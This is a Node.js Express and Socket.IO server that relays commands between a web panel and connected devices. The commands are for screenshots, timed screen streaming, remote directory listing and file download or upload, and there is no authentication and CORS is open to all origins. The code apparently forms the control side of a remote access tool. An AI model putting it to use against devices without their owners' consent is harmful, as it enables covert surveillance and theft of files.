const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);

// Increased buffer size for large file transfers (1GB limit)
const io = new Server(server, { 
    cors: { origin: "*" },
    maxHttpBufferSize: 1e9 
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

io.on('connection', (socket) => {
    console.log('Device connected:', socket.id);

    // --- SCREEN CAPTURE ---
    socket.on('send_screenshot', (data) => socket.broadcast.emit('receive_screenshot', data));
    socket.on('request_single_shot', () => socket.broadcast.emit('command_single_shot'));
    socket.on('request_timer_stream', (data) => socket.broadcast.emit('command_timer_stream', data));

    // --- FULL FILE MANAGER ---
    
    // Request list of files for a specific directory path
    socket.on('request_directory', (dirPath) => {
        socket.broadcast.emit('command_get_directory', dirPath);
    });

    // Receive directory list from app and send to web panel
    socket.on('send_directory_list', (data) => {
        socket.broadcast.emit('receive_directory_list', data);
    });

    // Request to download a specific file from app
    socket.on('request_download_file', (filePath) => {
        socket.broadcast.emit('command_download_file', filePath);
    });

    // Receive file data from app and send to web panel to trigger download
    socket.on('send_file_data', (fileData) => {
        socket.broadcast.emit('receive_file_data', fileData);
    });

    // Request to upload a file to the app's current directory
    socket.on('request_upload_file', (uploadData) => {
        socket.broadcast.emit('command_upload_file', uploadData);
    });

    socket.on('disconnect', () => {
        console.log('Device disconnected:', socket.id);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
